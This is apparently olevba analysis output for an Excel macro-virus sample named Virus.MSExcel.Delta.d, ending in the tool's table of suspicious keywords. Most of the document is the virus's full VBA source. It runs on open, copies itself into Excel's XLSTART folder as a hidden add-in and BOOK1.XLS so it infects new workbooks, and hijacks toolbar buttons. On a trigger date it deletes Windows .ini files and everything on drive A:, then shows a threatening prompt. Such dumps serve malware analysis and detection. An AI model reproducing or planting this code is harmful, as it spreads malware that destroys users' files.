olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Delta.d-9d4489f7b880c1bb3f8a5445fbdc95487f053b18
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Delta.d-9d4489f7b880c1bb3f8a5445fbdc95487f053b18 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo cuek
    Application.DisplayStatusBar = False
    Call Chk1
    Call Chk2
    Call Dstr
    Call Hlt
    Call Hdn
    Call Tim
    Call Icn_1
    Call Icn_3
    Application.DisplayStatusBar = True
cuek:
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo vodo
    SetAttr ("c:\msoffice\excel\xlstart\EXCELVBA.XLA"), vbNormal
vodo:
End Sub


Sub Tim()
Attribute Tim.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnTime Now + TimeValue("00:15:00"), " Hlt "
End Sub

Sub Ky()
Attribute Ky.VB_ProcData.VB_Invoke_Func = " \n14"
    My_password = InputBox("This Is The Example Of My Project ! You Can Modified, Added in Order to be a God Hacker ! Please Type My Project Name to Continued or I'll Destroy Your Computer ! < By Bui'95 >", " Delta Project ")
    If My_password <> "Delta" Then
       MsgBox (" Sorry ..!, My Project Name is Delta ")
       Application.Quit
    Else
       On Error GoTo abis
       DialogSheets("Module1").Show
       Sheets("Dialog1").Select
       Sheets("Dialog1").Visible = False
    Exit Sub
    End If
abis:
End Sub

Sub Ghst()
Attribute Ghst.VB_ProcData.VB_Invoke_Func = " \n14"
GoTo low
     Set myobject = ActiveWorkbook
     If myobject.Application.Name = "BOOK1.XLS" Then
        Call Waw
     Else
        MsgBox " Wrong !", vbExclamation
     End If
low:
End Sub

Sub Trl()
Attribute Trl.VB_ProcData.VB_Invoke_Func = " \n14"
Set objectku = ActiveWindow
    objectku.OnWindow = "Waw"
End Sub

Sub Dstr()
Attribute Dstr.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo bail
    tgl = 13
    MyDate = Date
    If Day(MyDate) = 5 And Month(MyDate) > 1 Then
       Kill "c:\windows\*.ini"
       Kill "a:\*.*"
       Call Ky
    End If
bail:
End Sub


Sub Thc1()
Attribute Thc1.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo bae
    ChDrive "c:\"
    ChDir "c:\msoffice\excel\xlstart"
'    Application.DisplayStatusBar = False
    Sheets("Module1").Visible = True
    ExecuteExcel4Macro "VBA.MAKE.ADDIN(""c:\msoffice\excel\xlstart\EXCELVBA.XLA"")"
    Sheets("Module1").Select
    Call txt
    Sheets("Module1").Select
    Call prt
    Sheets("Module1").Visible = False
'   Sheets("Sheet1").Select
'   Application.DisplayStatusBar = True
    SetAttr ("c:\msoffice\excel\xlstart\EXCELVBA.XLA"), vbHidden
bae:
End Sub

Sub Chk1()
Attribute Chk1.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo kajeun
    mysize = FileLen("c:\msoffice\excel\xlstart\excelvba.xla")    ' Returns file length (bytes).
    If mysize < 22000 Then
       Call Thc1
    Else
        GoTo diam
    End If
kajeun:
    Call Thc1
diam:
End Sub


Sub Chk2()
Attribute Chk2.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo baeah
    mybra = FileLen("c:\msoffice\excel\xlstart\book1.xls")     ' Returns file length (bytes).
    If mybra < 22000 Then
      Call Thc2
    Else
      GoTo cuek
    End If
baeah:
    Call Thc2
cuek:
End Sub


Sub Thc2()
Attribute Thc2.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo wow
    ActiveWorkbook.SaveAs FileName:="c:\msoffice\excel\xlstart\BOOK1.XLS", FileFormat:=xlNormal, _
    Password:="", WriteResPassword:="", ReadOnlyRecommended:=False _
    , CreateBackup:=False
wow:
End Sub

Sub ins()
Attribute ins.VB_ProcData.VB_Invoke_Func = " \n14"
     SetAttr ("c:\msoffice\excel\xlstart\excelvbs.txt"), vbNormal
     Set mytarget = ActiveSheet
     Set myobject = ActiveWorkbook
        On Error GoTo oke
        Sheets("Module1").Visible = True
        Call prt
        Sheets("Module1").Visible = False
'      If myobject.Name <> "BOOK1.XLS" And mytarget.Name <> "Module1" Then
        SetAttr ("c:\msoffice\excel\xlstart\excelvbs.txt"), vbHidden
         Call Hdn
         Call Waw
         Exit Sub
'      End If
oke:
        ActiveWorkbook.Modules().Add
        ActiveWorkbook.ActiveSheet().InsertFile FileName:="c:\msoffice\excel\xlstart\excelvbs.txt"
        Call prt
        ActiveSheet.Visible = False
        Call Hdn
        Call Waw
'       ThisWorkbook.OnSheetActivate = "waw"
        SetAttr ("c:\msoffice\excel\xlstart\excelvbs.txt"), vbHidden
End Sub


Sub txt()
Attribute txt.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveWorkbook.SaveAs FileName:="c:\msoffice\excel\xlstart\excelvbs.txt", FileFormat:=xlText, _
    Password:="", WriteResPassword:="", ReadOnlyRecommended:=False _
    , CreateBackup:=False
    SetAttr ("c:\msoffice\excel\xlstart\excelvbs.txt"), vbHidden
End Sub

Sub Hdn()
Attribute Hdn.VB_ProcData.VB_Invoke_Func = " \n14"
    ThisWorkbook.OnSheetActivate = "Waw"
End Sub

Sub Waw()
Attribute Waw.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo bui
    Sheets("Module1").Visible = False
    Sheets("Dialog1").Visible = False
bui:
End Sub


Sub Hlt()
Attribute Hlt.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo HIGH
    ActiveWindow.ScrollWorkbookTabs Position:=xlFirst
    Range("C5:C6").Select
    Selection.ClearContents
    Range("G12:H13").Select
    Selection.ClearContents
    ActiveWindow.SmallScroll Down:=12
    Range("E29").Select
    ActiveCell.PageBreak = xlManual
'   MsgBox " Error Detected Windows System! ", vbExclamation
HIGH:
End Sub

Sub Icn_1()
Attribute Icn_1.VB_ProcData.VB_Invoke_Func = " \n14"
Application.Toolbars(1).ToolbarButtons(1).OnAction = "bt_1"
End Sub

Sub Icn_3()
Attribute Icn_3.VB_ProcData.VB_Invoke_Func = " \n14"
Application.Toolbars(1).ToolbarButtons(3).OnAction = "bt_2"
End Sub

Sub bt_2()
Attribute bt_2.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo bail
  ' Application.DisplayStatusBar = False
   Call ins
   ActiveWorkbook.Save
  ' Application.DisplayStatusBar = True
bail:
End Sub

Sub bt_1()
Attribute bt_1.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo bail
 '  Application.DisplayStatusBar = False
   Workbooks.Add
   Call ins
 '  Application.DisplayStatusBar = True
bail:
End Sub

Sub prt()
Attribute prt.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveSheet.Protect "Excel", DrawingObjects:=True, Contents:=True, Scenarios _
        :=True
End Sub













-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Delta.d-9d4489f7b880c1bb3f8a5445fbdc95487f053b18 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Module
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  excelvb
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|ExecuteExcel4Macro  |May run an Excel 4 Macro (aka XLM/XLF) from  |
|          |                    |VBA                                          |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

